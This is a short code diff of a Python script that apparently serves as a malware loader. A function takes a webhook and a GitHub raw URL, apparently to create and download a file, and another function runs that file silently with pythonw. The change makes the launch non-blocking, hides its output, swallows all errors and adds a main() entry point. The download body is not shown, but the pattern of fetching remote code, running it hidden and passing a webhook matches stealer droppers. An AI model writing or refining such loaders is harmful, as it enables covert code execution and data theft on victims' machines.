@@ -21,10 +21,14 @@ def CreateFandDownloadIT(Webhooook, githubraw):
 
 def StartProg(FilePath):
     try:
-        command = ["pythonw", FilePath]
-        subprocess.run(command, shell=False)
+        subprocess.Popen(["pythonw", FilePath], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     except Exception as e:
         pass
 
-CreateFandDownloadIT(Webhooook, githubraw)
-StartProg(FilePath)
+def main():
+    
+    CreateFandDownloadIT(Webhooook, githubraw)
+    StartProg(FilePath)
+
+if __name__ == "__main__":
+    main()
